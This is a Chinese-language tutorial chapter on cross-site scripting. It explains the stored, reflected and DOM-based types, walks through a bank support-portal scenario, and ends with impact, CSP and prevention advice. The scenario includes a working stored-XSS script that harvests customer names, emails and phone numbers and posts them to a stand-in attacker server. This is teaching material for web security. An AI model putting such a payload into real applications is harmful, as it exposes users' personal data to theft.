# 跨站脚本（XSS）

绝大多数针对Web应用程序的攻击主要以服务器端应用程序为攻击目标。当然，许多这类攻击会侵害到其他用户，例如，盗窃其他用户数据的SQL注入攻击。但是，攻击者所使用的基本攻击方法是以无法预料的方式与服务器进行交互的，目的是执行未授权操作并非法访问数据。

另外一种类型的攻击的主要对象是应用程序的其他用户。服务器端应用程序仍然存在所有相关漏洞；然而，攻击者利用应用程序的一些行为执行针对其他终端用户的恶意操作。这些操作可能会造成一些与前会话劫持、未授权操作和披露个人信息相似的后果；还可能导致其他恶果，如记录键击或在用户的计算机上执行任意命令。

应用程序的服务器端以有限、可控的方式运行，而客户端可使用任意数量的各种浏览器技术（包括各种版本），由此客户端面临大范围可成功实施的攻击向量。

跨站脚本（XSS）漏洞是互联网上最常见的漏洞之一。它们直接响应了当今 Web 应用中日益增长的用户交互而出现。

最初，当XSS在Web应用程序安全社区广为人们所知时，一些专业渗透测试人员倾向于将XSS当做一种“次要”漏洞。这一部分是因为该漏洞在Web应用程序中极为常见，也因为与服务器端命令注入等许多漏洞相比，XSS并不能被独立黑客直接用于攻击应用程序。随着时间的推移，这种观点已发生改变，如今，XSS已被人们视为Web应用程序面临的主要的安全威胁。随着对客户端攻击的研究不断深入，人们开始讨论各种其他复杂性与利用XSS漏洞的攻击不相上下的攻击。与此同时，现实世界中也出现了大量利用XSS漏洞攻破知名机构的攻击。

通常情况下，XSS是一类主要的应用程序安全缺陷，它常常与其他漏洞一起造成破坏性的后果。有时，XSS攻击也可能转变成某种病毒或能够自我繁殖的蠕虫，这种攻击确实非常严重。在适当的情况下利用XSS漏洞即可完全攻破一个应用程序。

由于 XSS 发生在网站的上下文中，它不受同源策略（SOP）的约束，该策略旨在将不同网站相互隔离。

跨站脚本漏洞通常允许攻击者冒充受害用户，执行该用户能够执行的任何操作，并访问该用户的任何数据。如果受害用户在应用程序中拥有特权访问权限，则攻击者可能能够完全控制应用程序的所有功能和数据。

问题始于 JavaScript 最初被引入以通过动态内容增强用户体验。然而，当时安全并不是主要关注点，因为网络大部分是静态内容。随着 JavaScript 的发展，允许更多动态和交互式内容，XSS 成为了一个现实世界的问题，尽管当时大部分逻辑仍然在服务器端。

在过去十年中，Angular、React 和 Vue.js 等 JavaScript 框架变得流行，大量逻辑被转移到客户端。同样，单页应用程序（SPA）的兴起增加了 XSS 的攻击面，因为它们严重依赖客户端渲染。现代 Web 应用程序通常集成第三方服务和脚本，进一步增加了 XSS 的攻击面。

在此期间，浏览器和开发框架已经设计了多种解决方案来防御 XSS。这些方案包括 Internet Explorer 和 Chrome 等浏览器实现的 XSS 过滤器（后来被废弃）。XSS 沙盒、WAF 和基于黑名单的过滤器都尝试过，但都未能成功解决这个问题。迄今为止最有希望的似乎是内容安全策略（CSP）；然而，CSP 在现代企业环境中难以实施、管理和监控。简而言之，如果 CSP 严格，它将直接破坏 Web 应用程序；如果过于宽松，则会出现绕过。

在本章中，我们将深入研究 XSS，探索其各种类型以及攻击者如何利用它们。我们还将探讨一系列客户端注入漏洞，以及鲜为人知的攻击，如 DOM 劫持、客户端原型污染和 mXSS 等。

XSS 攻击的核心在于利用了 Web 应用在用户浏览器中执行脚本这一事实。任何类型的动态创建并执行的脚本，如果该脚本可以被污染或以任何方式修改（尤其是被最终用户修改），都会使 Web 应用面临风险。

XSS 攻击有多种分类方式，其中三大类型为：

- **存储型 XSS**（代码在执行前存储于数据库中）
- **反射型 XSS**（代码不存储在数据库中，而是由服务器反射）
- **基于 DOM 的 XSS**（代码在浏览器中存储和执行）

XSS 漏洞的分类主要取决于用户输入的处理方式，以及漏洞的根本原因是服务器端代码还是客户端代码。

## XSS 的发现与利用，情景示例

假设您对 mega-bank.com 提供的服务水平不满意。幸运的是，mega-bank.com 提供了一个客户支持门户 support.mega-bank.com，您可以在其中提交反馈，并有望收到客户支持代表的回复。

您在支持门户中写下以下评论：

> 我对贵行提供的服务不满意。  
> 我的存款等了 12 个小时才在 Web 应用中显示出来。  
> 请改进您的 Web 应用。  
> 其他银行会即时显示存款。  
> ——不满意的客户，support.mega-bank.com

现在，为了强调您对这家虚构银行有多么不满，您决定加粗几个词。不幸的是，提交支持请求的 UI 不支持文本加粗。

由于您略懂技术，您尝试添加一些 HTML 加粗标签：

> 我对贵行提供的服务不满意。  
> 我的存款等了 12 个小时才在 Web 应用中显示出来。  
> **<strong>请改进您的 Web 应用。</strong>**  
> 其他银行会即时显示存款。  
> ——不满意的客户，support.mega-bank.com

按下回车后，您的支持请求显示出来。`<strong></strong>` 标签内的文本确实被加粗了。

一位客户支持代表很快回复您：

> 您好，我是 MegaBank 支持的 Sam。  
> 很抱歉您对我们的应用不满意。  
> 我们计划下个月四号进行更新，应该会提高存款在应用中的反映速度。  
> 顺便问一下，您是如何加粗那段文字的？  
> ——客户支持部 Sam，support.mega-bank.com

这里发生的事情实际上在许多 Web 应用中相当常见。这里有一个非常简单的架构错误，如果被黑客发现，可能对公司造成致命打击：

```
用户通过 Web 表单提交评论 →
用户评论存储在数据库中 →
一个或多个用户通过 HTTP 请求请求该评论 →
评论被注入页面 →
注入的评论被解释为 DOM 而非文本
```

通常，这种情况是开发者直接将 HTTP 请求的结果应用到 DOM 上造成的。常见做法是使用如下脚本：

```javascript
/*
 * 创建一个 'div' 类型的 DOM 节点。
 * 向此 div 附加一个字符串，该字符串将被解释为 DOM 而非文本。
 */
const comment = 'my <strong>comment</strong>';
const div = document.createElement('div');
div.innerHTML = comment;

/*
 * 将 div 追加到 DOM，同时附带 comment 中的 innerHTML DOM。
 * 因为 comment 被解释为 DOM，它将在加载时被解析并转换为 DOM 元素。
 */
const wrapper = document.querySelector('#commentArea');
wrapper.appendChild(div);
```

由于文本被直接附加到 DOM，它被解释为 DOM 标记而非纯文本。在我们的客户支持请求中，恰好包含了一个 `<strong></strong>` 标签。

在更恶意的场景中，我们可以利用同样的漏洞造成严重破坏。`<script>` 标签是利用 XSS 漏洞最常用的方式，但还有许多其他方式可以利用此类漏洞。

假设支持评论包含的不是加粗标签，而是以下内容：

```html
> 我对贵行提供的服务不满意。  
> 我的存款等了 12 个小时才在 Web 应用中显示出来。  
> 请改进您的 Web 应用。  
> 其他银行会即时显示存款。  
> <script>
> /*
>  * 从页面中获取所有客户的列表。
>  */
> const customers = document.querySelectorAll('.openCases');
> /*
>  * 遍历每个包含 openCases 类的 DOM 元素，
>  * 收集特权个人身份信息（PII）并将数据存储在 customerData 数组中。
>  */
> const customerData = [];
> customers.forEach((customer) => {
>   customerData.push({
>     firstName: customer.querySelector('.firstName').innerText,
>     lastName: customer.querySelector('.lastName').innerText,
>     email: customer.querySelector('.email').innerText,
>     phone: customer.querySelector('.phone').innerText
>   });
> });
> /*
>  * 构建一个新的 HTTP 请求，将之前收集的数据外泄到黑客自己的服务器。
>  */
> const http = new XMLHttpRequest();
> http.open('POST', 'https://steal-your-data.com/data', true);
> http.setRequestHeader('Content-type', 'application/json');
> http.send(JSON.stringify(customerData));
> </script>
> ——不满意的客户，support.mega-bank.com
```

这是一个更恶意的用例。由于多种原因，它极其危险。上述代码就是所谓的**存储型 XSS 攻击**——一种依赖攻击代码实际存储在应用所有者数据库中的 XSS 变体。在此例中，我们发送给支持的评论正存储在 MegaBank 的服务器上。

当 `<script>` 标签通过 JavaScript 进入 DOM 时，浏览器的 JavaScript 解释器会立即被调用，并运行 `<script></script>` 标签内的代码。这意味着我们的代码无需客户支持代表进行任何交互就会运行。

这段代码简单的使用 `document.querySelector()` 遍历 DOM，窃取只有客户支持代表或 MegaBank 员工才能访问的特权数据。我们在 UI 中找到这些数据，将其转换为便于阅读和存储的 JSON，然后发送回我们自己的服务器以供使用或出售。

最可怕的是，由于这段代码位于 `<script>` 标签内，它对客户支持代表是不可见的。客户支持代表会看到字面请求文本，但 `<script></script>` 标签及其之间的所有内容都是隐藏的，在后台执行。浏览器会将文本解释为文本，但看到 `<script>` 标签会将其解释为脚本，就像合法开发者为合法网站编写内联脚本一样。

更有趣的是，如果另一位代表打开此评论，恶意脚本也会针对他们的浏览器状态运行。这意味着，由于脚本存储在数据库中，当通过 UI 请求并可见时，任何查看此评论的特权用户都会受到该脚本的攻击。

## XSS 概念验证

您可以通过注入一个使您自己的浏览器执行任意 JavaScript 的载荷来确认大多数类型的 XSS 漏洞。长期以来，使用 `alert()` 函数进行此操作一直是常见做法，因为它简短、无害，并且在成功调用时非常显眼。

不幸的是，如果您使用 Chrome，会有一些小问题。从 92 版本（2021 年 7 月 20 日）开始，跨源 iframe 被阻止调用 `alert()`。由于这些 iframe 用于构建一些更高级的 XSS 攻击，您有时需要使用替代的 PoC 载荷。在这种情况下，我们推荐使用 `print()` 函数。如果您有兴趣了解此更改的更多信息以及我们为什么喜欢 `print()`，请查看我们关于此主题的[博文](https://portswigger.net/research/alert-is-dead-long-live-print)。

## XSS 可以用来做什么？

利用跨站脚本漏洞的攻击者通常能够：

- 冒充或伪装成受害用户。
- 执行用户能够执行的任何操作。
- 读取用户能够访问的任何数据。
- 捕获用户的登录凭据。
- 对网站进行虚拟篡改。
- 向网站注入木马功能。

## XSS 漏洞的影响

XSS 攻击的实际影响通常取决于应用程序的性质、其功能和数据，以及被攻陷用户的状态。例如：

- 在一个所有用户均为匿名且所有信息均为公开的宣传册型应用程序中，影响通常很小。
- 在持有敏感数据（如银行交易、电子邮件或医疗记录）的应用程序中，影响通常是严重的。
- 如果被攻陷的用户在应用程序中拥有提升的权限，那么影响通常是危急的，允许攻击者完全控制易受攻击的应用程序，并危害所有用户及其数据。


## 内容安全策略

内容安全策略（CSP）是一种浏览器机制，旨在减轻跨站脚本和其他一些漏洞的影响。如果采用 CSP 的应用程序包含类似 XSS 的行为，那么 CSP 可能阻碍或阻止漏洞的利用。通常，CSP 可以被绕过，从而利用底层漏洞。


## 悬挂标记注入

悬挂标记注入是一种技术，可以在无法进行完整跨站脚本利用（由于输入过滤器或其他防御措施）的情况下，用于跨域捕获数据。它通常可以被利用来捕获对其他用户可见的敏感信息，包括可用于代表用户执行未经授权操作的 CSRF 令牌。


## 如何防止 XSS 攻击

在某些情况下，防止跨站脚本很简单，但根据应用程序的复杂性及其处理用户可控数据的方式，可能会更加困难。

总的来说，有效防止 XSS 漏洞可能需要结合以下措施：

- **在输入时进行过滤。** 在接收用户输入时，根据预期或有效的输入尽可能严格地进行过滤。
- **在输出时对数据进行编码。** 在将用户可控数据输出到 HTTP 响应时，对输出进行编码，以防止其被解释为活动内容。根据输出上下文，这可能需要应用 HTML、URL、JavaScript 和 CSS 编码的组合。
- **使用适当的响应头。** 对于不打算包含任何 HTML 或 JavaScript 的 HTTP 响应，您可以使用 `Content-Type` 和 `X-Content-Type-Options` 头，以确保浏览器按您预期的方式解释响应。
- **内容安全策略。** 作为最后一道防线，您可以使用内容安全策略（CSP）来减轻任何仍然发生的 XSS 漏洞的严重性。
